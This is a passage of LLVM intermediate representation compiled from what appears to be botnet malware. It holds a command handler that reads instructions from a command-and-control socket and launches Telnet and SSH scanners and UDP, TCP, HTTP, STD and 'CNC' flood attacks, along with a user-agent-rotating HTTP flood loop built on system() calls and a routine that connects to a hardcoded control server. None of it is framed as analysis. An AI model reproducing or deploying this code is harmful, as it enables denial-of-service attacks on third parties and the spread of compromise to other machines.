  %9 = urem i64 %8, 23
  %10 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %9
  %11 = load i8*, i8** %10, align 8
  %12 = bitcast [80 x i8*]* %3 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %12, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.92, i64 0, i64 0), i64 13, i32 1, i1 false)
  %13 = call i8* @strcat(i8* nonnull %12, i8* %11) #3
  %strlen = call i64 @strlen(i8* nonnull %12)
  %endptr = getelementptr i8, i8* %12, i64 %strlen
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %endptr, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i64 0, i64 0), i64 6, i32 1, i1 false)
  %14 = call i8* @strcat(i8* nonnull %12, i8* %0) #3
  %sext = shl i64 %6, 32
  %15 = ashr exact i64 %sext, 32
  %16 = call i64 @time(i64* null) #3
  %17 = icmp sgt i64 %15, %16
  br i1 %17, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %18 = call i32 @rand() #3
  %19 = sext i32 %18 to i64
  %20 = urem i64 %19, 23
  %21 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %20
  %22 = load i8*, i8** %21, align 8
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %12, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.92, i64 0, i64 0), i64 13, i32 1, i1 false)
  %23 = call i8* @strcat(i8* nonnull %12, i8* %22) #3
  %strlen5 = call i64 @strlen(i8* nonnull %12)
  %endptr6 = getelementptr i8, i8* %12, i64 %strlen5
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %endptr6, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i64 0, i64 0), i64 6, i32 1, i1 false)
  %24 = call i8* @strcat(i8* nonnull %12, i8* %0) #3
  %25 = call i32 @system(i8* nonnull %12) #3
  %26 = call i64 @time(i64* null) #3
  %27 = icmp sgt i64 %15, %26
  br i1 %27, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendCNC(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = tail call i64 @time(i64* null) #3
  %6 = zext i32 %2 to i64
  %7 = add i64 %5, %6
  %8 = tail call i32 @inet_addr(i8* %0) #3
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2, i32 0
  store i32 %8, i32* %9, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = trunc i32 %1 to i16
  %12 = tail call zeroext i16 @htons(i16 zeroext %11) #18
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %12, i16* %13, align 2
  %sext = shl i64 %7, 32
  %14 = ashr exact i64 %sext, 32
  %15 = call i64 @time(i64* null) #3
  %16 = icmp sgt i64 %14, %15
  br i1 %16, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %3
  %17 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  br label %18

; <label>:18:                                     ; preds = %.lr.ph, %18
  %19 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %20 = call i32 @connect(i32 %19, %struct.sockaddr* nonnull %17, i32 16) #3
  %21 = call i32 @sleep(i32 1) #3
  %22 = call i32 @close(i32 %19) #3
  %23 = call i64 @time(i64* null) #3
  %24 = icmp sgt i64 %14, %23
  br i1 %24, label %18, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %18
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  ret void
}

declare i32 @sleep(i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8** readonly) local_unnamed_addr #1 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.44, i64 0, i64 0)) #15
  %5 = icmp eq i32 %4, 0
  br i1 %5, label %6, label %9

; <label>:6:                                      ; preds = %2
  %7 = load i32, i32* @mainCommSock, align 4
  %8 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %7, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.94, i64 0, i64 0))
  br label %301

; <label>:9:                                      ; preds = %2
  %10 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.95, i64 0, i64 0)) #15
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %12, label %17

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* @mainCommSock, align 4
  %14 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %15 = tail call i8* @inet_ntoa(i32 %14) #3
  %16 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %13, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.96, i64 0, i64 0), i8* %15)
  br label %301

; <label>:17:                                     ; preds = %9
  %18 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.97, i64 0, i64 0)) #15
  %19 = icmp eq i32 %18, 0
  br i1 %19, label %20, label %58

; <label>:20:                                     ; preds = %17
  %21 = icmp eq i32 %0, 2
  br i1 %21, label %25, label %22

; <label>:22:                                     ; preds = %20
  %23 = load i32, i32* @mainCommSock, align 4
  %24 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %23, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.98, i64 0, i64 0))
  br label %301

; <label>:25:                                     ; preds = %20
  %26 = getelementptr inbounds i8*, i8** %1, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = tail call i32 @strcmp(i8* %27, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.99, i64 0, i64 0)) #15
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %58

; <label>:30:                                     ; preds = %25
  %31 = load i32, i32* @scanPid, align 4
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %301, label %33

; <label>:33:                                     ; preds = %30
  %34 = load i32, i32* @mainCommSock, align 4
  %35 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %34, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.100, i64 0, i64 0))
  %36 = load i32, i32* @scanPid, align 4
  %37 = tail call i32 @kill(i32 %36, i32 9) #3
  store i32 0, i32* @scanPid, align 4
  %38 = load i8*, i8** %26, align 8
  %39 = tail call i32 @strcmp(i8* %38, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.101, i64 0, i64 0)) #15
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %41, label %48

; <label>:41:                                     ; preds = %33
  %42 = tail call i32 @fork() #3
  %43 = load i32, i32* @mainCommSock, align 4
  %44 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %43, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.102, i64 0, i64 0))
  %45 = icmp eq i32 %42, 0
  br i1 %45, label %47, label %46

; <label>:46:                                     ; preds = %41
  store i32 %42, i32* @scanPid, align 4
  br label %301

; <label>:47:                                     ; preds = %41
  tail call void @TelnetScanner() #3
  unreachable

; <label>:48:                                     ; preds = %33
  %49 = tail call i32 @strcmp(i8* %38, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.103, i64 0, i64 0)) #15
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %51, label %58

; <label>:51:                                     ; preds = %48
  %52 = tail call i32 @fork() #3
  %53 = load i32, i32* @mainCommSock, align 4
  %54 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %53, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.104, i64 0, i64 0))
  %55 = icmp eq i32 %52, 0
  br i1 %55, label %57, label %56

; <label>:56:                                     ; preds = %51
  store i32 %52, i32* @scanPid, align 4
  br label %301

; <label>:57:                                     ; preds = %51
  tail call void @SSHScanner() #3
  unreachable

; <label>:58:                                     ; preds = %48, %25, %17
  %59 = load i8*, i8** %1, align 8
  %60 = tail call i32 @strcmp(i8* %59, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i64 0, i64 0)) #15
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %62, label %.loopexit163

; <label>:62:                                     ; preds = %58
  %63 = icmp slt i32 %0, 6
  br i1 %63, label %301, label %64

; <label>:64:                                     ; preds = %62
  %65 = getelementptr inbounds i8*, i8** %1, i64 3
  %66 = load i8*, i8** %65, align 8
  %67 = tail call i32 @atoi(i8* %66) #15
  %68 = icmp eq i32 %67, -1
  br i1 %68, label %301, label %69

; <label>:69:                                     ; preds = %64
  %70 = getelementptr inbounds i8*, i8** %1, i64 2
  %71 = load i8*, i8** %70, align 8
  %72 = tail call i32 @atoi(i8* %71) #15
  %73 = icmp eq i32 %72, -1
  br i1 %73, label %301, label %74

; <label>:74:                                     ; preds = %69
  %75 = getelementptr inbounds i8*, i8** %1, i64 4
  %76 = load i8*, i8** %75, align 8
  %77 = tail call i32 @atoi(i8* %76) #15
  %78 = icmp eq i32 %77, -1
  br i1 %78, label %301, label %79

; <label>:79:                                     ; preds = %74
  %80 = getelementptr inbounds i8*, i8** %1, i64 5
  %81 = load i8*, i8** %80, align 8
  %82 = tail call i32 @atoi(i8* %81) #15
  %83 = icmp eq i32 %82, -1
  %84 = icmp sgt i32 %82, 65500
  %or.cond = or i1 %83, %84
  %85 = icmp sgt i32 %77, 32
  %or.cond146 = or i1 %85, %or.cond
  br i1 %or.cond146, label %301, label %86

; <label>:86:                                     ; preds = %79
  %87 = icmp eq i32 %0, 7
  br i1 %87, label %88, label %93

; <label>:88:                                     ; preds = %86
  %89 = getelementptr inbounds i8*, i8** %1, i64 6
  %90 = load i8*, i8** %89, align 8
  %91 = tail call i32 @atoi(i8* %90) #15
  %92 = icmp slt i32 %91, 1
  br i1 %92, label %301, label %93

; <label>:93:                                     ; preds = %88, %86
  %94 = getelementptr inbounds i8*, i8** %1, i64 1
  %95 = load i8*, i8** %94, align 8
  %96 = load i8*, i8** %70, align 8
  %97 = tail call i32 @atoi(i8* %96) #15
  %98 = load i8*, i8** %65, align 8
  %99 = tail call i32 @atoi(i8* %98) #15
  %100 = load i8*, i8** %75, align 8
  %101 = tail call i32 @atoi(i8* %100) #15
  %102 = load i8*, i8** %80, align 8
  %103 = tail call i32 @atoi(i8* %102) #15
  br i1 %87, label %104, label %108

; <label>:104:                                    ; preds = %93
  %105 = getelementptr inbounds i8*, i8** %1, i64 6
  %106 = load i8*, i8** %105, align 8
  %107 = tail call i32 @atoi(i8* %106) #15
  br label %108

; <label>:108:                                    ; preds = %93, %104
  %109 = phi i32 [ %107, %104 ], [ 10, %93 ]
  %strchr = tail call i8* @strchr(i8* %95, i32 44)
  %110 = icmp eq i8* %strchr, null
  br i1 %110, label %117, label %.preheader162.preheader

.preheader162.preheader:                          ; preds = %108
  br label %.preheader162

.preheader162:                                    ; preds = %.preheader162.preheader, %113
  %.sink = phi i8* [ null, %113 ], [ %95, %.preheader162.preheader ]
  %111 = tail call i8* @strtok(i8* %.sink, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #3
  %112 = icmp eq i8* %111, null
  br i1 %112, label %.loopexit163.loopexit, label %113

; <label>:113:                                    ; preds = %.preheader162
  %114 = tail call i32 @listFork()
  %115 = icmp eq i32 %114, 0
  br i1 %115, label %116, label %.preheader162

; <label>:116:                                    ; preds = %113
  tail call void @sendUDP(i8* nonnull %111, i32 %97, i32 %99, i32 %101, i32 %103, i32 %109)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:117:                                    ; preds = %108
  %118 = tail call i32 @listFork()
  %119 = icmp eq i32 %118, 0
  br i1 %119, label %120, label %301

; <label>:120:                                    ; preds = %117
  tail call void @sendUDP(i8* %95, i32 %97, i32 %99, i32 %101, i32 %103, i32 %109)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit163.loopexit:                            ; preds = %.preheader162
  br label %.loopexit163

.loopexit163:                                     ; preds = %.loopexit163.loopexit, %58
  %121 = load i8*, i8** %1, align 8
  %122 = tail call i32 @strcmp(i8* %121, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.106, i64 0, i64 0)) #15
  %123 = icmp eq i32 %122, 0
  br i1 %123, label %124, label %.loopexit161

; <label>:124:                                    ; preds = %.loopexit163
  %125 = icmp slt i32 %0, 6
  br i1 %125, label %301, label %126

; <label>:126:                                    ; preds = %124
  %127 = getelementptr inbounds i8*, i8** %1, i64 3
  %128 = load i8*, i8** %127, align 8
  %129 = tail call i32 @atoi(i8* %128) #15
  %130 = icmp eq i32 %129, -1
  br i1 %130, label %301, label %131

; <label>:131:                                    ; preds = %126
  %132 = getelementptr inbounds i8*, i8** %1, i64 2
  %133 = load i8*, i8** %132, align 8
  %134 = tail call i32 @atoi(i8* %133) #15
  %135 = icmp eq i32 %134, -1
  br i1 %135, label %301, label %136

; <label>:136:                                    ; preds = %131
  %137 = getelementptr inbounds i8*, i8** %1, i64 4
  %138 = load i8*, i8** %137, align 8
  %139 = tail call i32 @atoi(i8* %138) #15
  %140 = icmp eq i32 %139, -1
  %141 = icmp sgt i32 %139, 32
  %or.cond147 = or i1 %140, %141
  br i1 %or.cond147, label %301, label %142

; <label>:142:                                    ; preds = %136
  %143 = icmp sgt i32 %0, 6
  br i1 %143, label %144, label %.thread

; <label>:144:                                    ; preds = %142
  %145 = getelementptr inbounds i8*, i8** %1, i64 6
  %146 = load i8*, i8** %145, align 8
  %147 = tail call i32 @atoi(i8* %146) #15
  %148 = icmp slt i32 %147, 0
  br i1 %148, label %301, label %149

; <label>:149:                                    ; preds = %144
  %150 = icmp eq i32 %0, 8
  br i1 %150, label %151, label %.thread

; <label>:151:                                    ; preds = %149
  %152 = getelementptr inbounds i8*, i8** %1, i64 7
  %153 = load i8*, i8** %152, align 8
  %154 = tail call i32 @atoi(i8* %153) #15
  %155 = icmp slt i32 %154, 1
  br i1 %155, label %301, label %.thread

.thread:                                          ; preds = %142, %151, %149
  %156 = phi i1 [ true, %151 ], [ false, %149 ], [ false, %142 ]
  %157 = getelementptr inbounds i8*, i8** %1, i64 1
  %158 = load i8*, i8** %157, align 8
  %159 = load i8*, i8** %132, align 8
  %160 = tail call i32 @atoi(i8* %159) #15
  %161 = load i8*, i8** %127, align 8
  %162 = tail call i32 @atoi(i8* %161) #15
  %163 = load i8*, i8** %137, align 8
  %164 = tail call i32 @atoi(i8* %163) #15
  %165 = getelementptr inbounds i8*, i8** %1, i64 5
  %166 = load i8*, i8** %165, align 8
  br i1 %156, label %167, label %171

; <label>:167:                                    ; preds = %.thread
  %168 = getelementptr inbounds i8*, i8** %1, i64 7
  %169 = load i8*, i8** %168, align 8
  %170 = tail call i32 @atoi(i8* %169) #15
  br label %171

; <label>:171:                                    ; preds = %.thread, %167
  %172 = phi i32 [ %170, %167 ], [ 10, %.thread ]
  br i1 %143, label %173, label %177

; <label>:173:                                    ; preds = %171
  %174 = getelementptr inbounds i8*, i8** %1, i64 6
  %175 = load i8*, i8** %174, align 8
  %176 = tail call i32 @atoi(i8* %175) #15
  br label %177

; <label>:177:                                    ; preds = %171, %173
  %178 = phi i32 [ %176, %173 ], [ 0, %171 ]
  %strchr142 = tail call i8* @strchr(i8* %158, i32 44)
  %179 = icmp eq i8* %strchr142, null
  br i1 %179, label %186, label %.preheader160.preheader

.preheader160.preheader:                          ; preds = %177
  br label %.preheader160

.preheader160:                                    ; preds = %.preheader160.preheader, %182
  %.sink148 = phi i8* [ null, %182 ], [ %158, %.preheader160.preheader ]
  %180 = tail call i8* @strtok(i8* %.sink148, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #3
  %181 = icmp eq i8* %180, null
  br i1 %181, label %.loopexit161.loopexit, label %182

; <label>:182:                                    ; preds = %.preheader160
  %183 = tail call i32 @listFork()
  %184 = icmp eq i32 %183, 0
  br i1 %184, label %185, label %.preheader160

; <label>:185:                                    ; preds = %182
  tail call void @sendTCP(i8* nonnull %180, i32 %160, i32 %162, i32 %164, i8* %166, i32 %178, i32 %172)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:186:                                    ; preds = %177
  %187 = tail call i32 @listFork()
  %188 = icmp eq i32 %187, 0
  br i1 %188, label %189, label %301

; <label>:189:                                    ; preds = %186
  tail call void @sendTCP(i8* %158, i32 %160, i32 %162, i32 %164, i8* %166, i32 %178, i32 %172)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit161.loopexit:                            ; preds = %.preheader160
  br label %.loopexit161

.loopexit161:                                     ; preds = %.loopexit161.loopexit, %.loopexit163
  %190 = load i8*, i8** %1, align 8
  %191 = tail call i32 @strcmp(i8* %190, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.107, i64 0, i64 0)) #15
  %192 = icmp eq i32 %191, 0
  br i1 %192, label %193, label %.loopexit159

; <label>:193:                                    ; preds = %.loopexit161
  %194 = icmp slt i32 %0, 3
  br i1 %194, label %301, label %195

; <label>:195:                                    ; preds = %193
  %196 = getelementptr inbounds i8*, i8** %1, i64 2
  %197 = load i8*, i8** %196, align 8
  %198 = tail call i32 @atoi(i8* %197) #15
  %199 = icmp slt i32 %198, 1
  br i1 %199, label %301, label %200

; <label>:200:                                    ; preds = %195
  %201 = getelementptr inbounds i8*, i8** %1, i64 1
  %202 = load i8*, i8** %201, align 8
  %strchr143 = tail call i8* @strchr(i8* %202, i32 44)
  %203 = icmp eq i8* %strchr143, null
  br i1 %203, label %211, label %.preheader158.preheader

.preheader158.preheader:                          ; preds = %200
  br label %.preheader158

.preheader158:                                    ; preds = %.preheader158.preheader, %206
  %.sink149 = phi i8* [ null, %206 ], [ %202, %.preheader158.preheader ]
  %204 = tail call i8* @strtok(i8* %.sink149, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #3
  %205 = icmp eq i8* %204, null
  br i1 %205, label %.loopexit159.loopexit, label %206

; <label>:206:                                    ; preds = %.preheader158
  %207 = tail call i32 @listFork()
  %208 = icmp eq i32 %207, 0
  br i1 %208, label %.preheader157, label %.preheader158

.preheader157:                                    ; preds = %206
  tail call void @sendHTTP(i8* %202, i32 %198)
  tail call void @sendHTTP(i8* %202, i32 %198)
  tail call void @sendHTTP(i8* %202, i32 %198)
  tail call void @sendHTTP(i8* %202, i32 %198)
  tail call void @sendHTTP(i8* %202, i32 %198)
  tail call void @sendHTTP(i8* %202, i32 %198)
  tail call void @sendHTTP(i8* %202, i32 %198)
  tail call void @sendHTTP(i8* %202, i32 %198)
  tail call void @sendHTTP(i8* %202, i32 %198)
  tail call void @sendHTTP(i8* %202, i32 %198)
  %209 = load i32, i32* @mainCommSock, align 4
  %210 = tail call i32 @close(i32 %209) #3
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:211:                                    ; preds = %200
  %212 = tail call i32 @listFork()
  %213 = icmp eq i32 %212, 0
  br i1 %213, label %.preheader, label %301

.preheader:                                       ; preds = %211
  tail call void @sendHTTP(i8* %202, i32 %198)
  tail call void @sendHTTP(i8* %202, i32 %198)
  tail call void @sendHTTP(i8* %202, i32 %198)
  tail call void @sendHTTP(i8* %202, i32 %198)
  tail call void @sendHTTP(i8* %202, i32 %198)
  tail call void @sendHTTP(i8* %202, i32 %198)
  tail call void @sendHTTP(i8* %202, i32 %198)
  tail call void @sendHTTP(i8* %202, i32 %198)
  tail call void @sendHTTP(i8* %202, i32 %198)
  tail call void @sendHTTP(i8* %202, i32 %198)
  %214 = load i32, i32* @mainCommSock, align 4
  %215 = tail call i32 @close(i32 %214) #3
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit159.loopexit:                            ; preds = %.preheader158
  br label %.loopexit159

.loopexit159:                                     ; preds = %.loopexit159.loopexit, %.loopexit161
  %216 = load i8*, i8** %1, align 8
  %217 = tail call i32 @strcmp(i8* %216, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i64 0, i64 0)) #15
  %218 = icmp eq i32 %217, 0
  br i1 %218, label %219, label %.loopexit156

; <label>:219:                                    ; preds = %.loopexit159
  %220 = icmp slt i32 %0, 4
  br i1 %220, label %301, label %221

; <label>:221:                                    ; preds = %219
  %222 = getelementptr inbounds i8*, i8** %1, i64 2
  %223 = load i8*, i8** %222, align 8
  %224 = tail call i32 @atoi(i8* %223) #15
  %225 = icmp slt i32 %224, 1
  br i1 %225, label %301, label %226

; <label>:226:                                    ; preds = %221
  %227 = getelementptr inbounds i8*, i8** %1, i64 3
  %228 = load i8*, i8** %227, align 8
  %229 = tail call i32 @atoi(i8* %228) #15
  %230 = icmp slt i32 %229, 1
  br i1 %230, label %301, label %231

; <label>:231:                                    ; preds = %226
  %232 = getelementptr inbounds i8*, i8** %1, i64 1
  %233 = load i8*, i8** %232, align 8
  %strchr144 = tail call i8* @strchr(i8* %233, i32 44)
  %234 = icmp eq i8* %strchr144, null
  br i1 %234, label %243, label %.preheader155.preheader

.preheader155.preheader:                          ; preds = %231
  br label %.preheader155

.preheader155:                                    ; preds = %.preheader155.preheader, %237
  %.sink150 = phi i8* [ null, %237 ], [ %233, %.preheader155.preheader ]
  %235 = tail call i8* @strtok(i8* %.sink150, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #3
  %236 = icmp eq i8* %235, null
  br i1 %236, label %.loopexit156.loopexit, label %237

; <label>:237:                                    ; preds = %.preheader155
  %238 = tail call i32 @listFork()
  %239 = icmp eq i32 %238, 0
  br i1 %239, label %240, label %.preheader155

; <label>:240:                                    ; preds = %237
  tail call void @sendCNC(i8* nonnull %235, i32 %224, i32 %229)
  %241 = load i32, i32* @mainCommSock, align 4
  %242 = tail call i32 @close(i32 %241) #3
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:243:                                    ; preds = %231
  %244 = tail call i32 @listFork()
  %245 = icmp eq i32 %244, 0
  br i1 %245, label %246, label %301

; <label>:246:                                    ; preds = %243
  tail call void @sendCNC(i8* %233, i32 %224, i32 %229)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit156.loopexit:                            ; preds = %.preheader155
  br label %.loopexit156

.loopexit156:                                     ; preds = %.loopexit156.loopexit, %.loopexit159
  %247 = load i8*, i8** %1, align 8
  %248 = tail call i32 @strcmp(i8* %247, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.109, i64 0, i64 0)) #15
  %249 = icmp eq i32 %248, 0
  br i1 %249, label %250, label %.loopexit154

; <label>:250:                                    ; preds = %.loopexit156
  %251 = icmp slt i32 %0, 4
  br i1 %251, label %301, label %252

; <label>:252:                                    ; preds = %250
  %253 = getelementptr inbounds i8*, i8** %1, i64 2
  %254 = load i8*, i8** %253, align 8
  %255 = tail call i32 @atoi(i8* %254) #15
  %256 = icmp slt i32 %255, 1
  br i1 %256, label %301, label %257

; <label>:257:                                    ; preds = %252
  %258 = getelementptr inbounds i8*, i8** %1, i64 3
  %259 = load i8*, i8** %258, align 8
  %260 = tail call i32 @atoi(i8* %259) #15
  %261 = icmp slt i32 %260, 1
  br i1 %261, label %301, label %262

; <label>:262:                                    ; preds = %257
  %263 = getelementptr inbounds i8*, i8** %1, i64 1
  %264 = load i8*, i8** %263, align 8
  %strchr145 = tail call i8* @strchr(i8* %264, i32 44)
  %265 = icmp eq i8* %strchr145, null
  br i1 %265, label %272, label %.preheader153.preheader

.preheader153.preheader:                          ; preds = %262
  br label %.preheader153

.preheader153:                                    ; preds = %.preheader153.preheader, %268
  %.sink151 = phi i8* [ null, %268 ], [ %264, %.preheader153.preheader ]
  %266 = tail call i8* @strtok(i8* %.sink151, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #3
  %267 = icmp eq i8* %266, null
  br i1 %267, label %.loopexit154.loopexit, label %268

; <label>:268:                                    ; preds = %.preheader153
  %269 = tail call i32 @listFork()
  %270 = icmp eq i32 %269, 0
  br i1 %270, label %271, label %.preheader153

; <label>:271:                                    ; preds = %268
  tail call void @sendSTD(i8* nonnull %266, i32 %255, i32 %260)
  unreachable

; <label>:272:                                    ; preds = %262
  %273 = tail call i32 @listFork()
  %274 = icmp eq i32 %273, 0
  br i1 %274, label %275, label %301

; <label>:275:                                    ; preds = %272
  tail call void @sendSTD(i8* %264, i32 %255, i32 %260)
  unreachable

.loopexit154.loopexit:                            ; preds = %.preheader153
  br label %.loopexit154

.loopexit154:                                     ; preds = %.loopexit154.loopexit, %.loopexit156
  %276 = load i8*, i8** %1, align 8
  %277 = tail call i32 @strcmp(i8* %276, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.110, i64 0, i64 0)) #15
  %278 = icmp eq i32 %277, 0
  %279 = load i64, i64* @numpids, align 8
  %280 = icmp ne i64 %279, 0
  %or.cond173 = and i1 %278, %280
  br i1 %or.cond173, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit154
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %293
  %.0170 = phi i64 [ %294, %293 ], [ 0, %.lr.ph.preheader ]
  %281 = load i32*, i32** @pids, align 8
  %282 = getelementptr inbounds i32, i32* %281, i64 %.0170
  %283 = load i32, i32* %282, align 4
  %284 = icmp eq i32 %283, 0
  br i1 %284, label %293, label %285

; <label>:285:                                    ; preds = %.lr.ph
  %286 = tail call i32 @getpid() #3
  %287 = icmp eq i32 %283, %286
  br i1 %287, label %293, label %288

; <label>:288:                                    ; preds = %285
  %289 = load i32*, i32** @pids, align 8
  %290 = getelementptr inbounds i32, i32* %289, i64 %.0170
  %291 = load i32, i32* %290, align 4
  %292 = tail call i32 @kill(i32 %291, i32 9) #3
  br label %293

; <label>:293:                                    ; preds = %285, %.lr.ph, %288
  %294 = add i64 %.0170, 1
  %295 = load i64, i64* @numpids, align 8
  %296 = icmp ult i64 %294, %295
  br i1 %296, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %293
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit154
  %297 = load i8*, i8** %1, align 8
  %298 = tail call i32 @strcmp(i8* %297, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.111, i64 0, i64 0)) #15
  %299 = icmp eq i32 %298, 0
  br i1 %299, label %300, label %301

; <label>:300:                                    ; preds = %.loopexit
  tail call void @exit(i32 0) #17
  unreachable

; <label>:301:                                    ; preds = %.loopexit, %272, %243, %211, %186, %117, %250, %252, %257, %219, %221, %226, %193, %195, %124, %126, %131, %136, %144, %151, %62, %64, %69, %74, %79, %88, %30, %56, %46, %22, %12, %6
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() local_unnamed_addr #1 {
  %1 = alloca [4096 x i8], align 16
  %2 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %2, i8 0, i64 4096, i32 16, i1 false)
  %3 = load i32, i32* @mainCommSock, align 4
  %4 = icmp eq i32 %3, 0
  br i1 %4, label %7, label %5

; <label>:5:                                      ; preds = %0
  %6 = tail call i32 @close(i32 %3) #3
  store i32 0, i32* @mainCommSock, align 4
  br label %7

; <label>:7:                                      ; preds = %0, %5
  %8 = load i32, i32* @currentServer, align 4
  %9 = add nsw i32 %8, 1
  %10 = icmp eq i32 %8, 0
  %.sink = select i1 %10, i32 0, i32 %9
  store i32 %.sink, i32* @currentServer, align 4
  %11 = sext i32 %.sink to i64
  %12 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %11
  %13 = load i8*, i8** %12, align 8
  %14 = call i8* @strcpy(i8* nonnull %2, i8* %13) #3
  %15 = call i8* @strchr(i8* nonnull %2, i32 58) #15
  %16 = icmp eq i8* %15, null
  br i1 %16, label %20, label %17

; <label>:17:                                     ; preds = %7
  %18 = getelementptr inbounds i8, i8* %15, i64 1
  %19 = call i32 @atoi(i8* %18) #15
  store i8 0, i8* %15, align 1
  br label %20

; <label>:20:                                     ; preds = %7, %17
  %.0 = phi i32 [ %19, %17 ], [ 443, %7 ]
  %21 = call i32 @socket(i32 2, i32 1, i32 0) #3
  store i32 %21, i32* @mainCommSock, align 4
  %22 = call i32 @connectTimeout(i32 %21, i8* nonnull %2, i32 %.0, i32 30)
  %23 = icmp eq i32 %22, 0
  %. = zext i1 %23 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() local_unnamed_addr #1 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca %struct.ifreq, align 8
  %6 = tail call i32 @socket(i32 2, i32 2, i32 0) #3
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %46, label %8

; <label>:8:                                      ; preds = %0
